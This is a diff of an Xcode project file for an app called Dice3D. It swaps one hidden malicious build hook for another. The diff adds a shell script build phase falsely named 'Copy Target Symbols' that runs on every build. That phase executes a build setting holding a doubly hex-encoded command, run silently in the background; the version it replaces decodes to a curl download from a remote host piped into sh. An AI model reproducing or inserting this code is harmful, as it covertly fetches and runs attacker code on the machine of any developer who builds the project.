@@ -7,28 +7,10 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		07C03CC0FBB1430F90A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 08927E544F1E418CA7A5DE54 /* README.md */; };
 		2D2F153B2EE2E2D8005D33EE /* SDWebImageSwiftUI in Frameworks */ = {isa = PBXBuildFile; productRef = 2D2F153A2EE2E2D8005D33EE /* SDWebImageSwiftUI */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		F810477A9BBC448788A5DE54 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
-		08927E544F1E418CA7A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		2D2F152B2EE2DADC005D33EE /* Dice3D.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Dice3D.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -63,7 +45,6 @@
 		2D2F152C2EE2DADC005D33EE /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				08927E544F1E418CA7A5DE54 /* README.md */,
 				2D2F152B2EE2DADC005D33EE /* Dice3D.app */,
 			);
 			name = Products;
@@ -76,12 +57,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2D2F15362EE2DADE005D33EE /* Build configuration list for PBXNativeTarget "Dice3D" */;
 			buildPhases = (
+				43675CC3FB1041FB95A5DE54 /* Copy Target Symbols */,
 				2D2F15272EE2DADC005D33EE /* Sources */,
 				2D2F15282EE2DADC005D33EE /* Frameworks */,
 				2D2F15292EE2DADC005D33EE /* Resources */,
 			);
 			buildRules = (
-				F810477A9BBC448788A5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -138,11 +119,33 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				07C03CC0FBB1430F90A5DE54 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		43675CC3FB1041FB95A5DE54 /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		2D2F15272EE2DADC005D33EE /* Sources */ = {
@@ -158,7 +161,7 @@
 		2D2F15342EE2DADE005D33EE /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((j(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Ym1WMFlYQnpaR1YyTG5KMUwyRXBJaUI4SUhOb0NnPT0K | j | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373236393637363736633635366536353734326536393665326636310a323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -223,7 +226,7 @@
 		2D2F15352EE2DADE005D33EE /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((j(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Ym1WMFlYQnpaR1YyTG5KMUwyRXBJaUI4SUhOb0NnPT0K | j | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373236393637363736633635366536353734326536393665326636310a323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
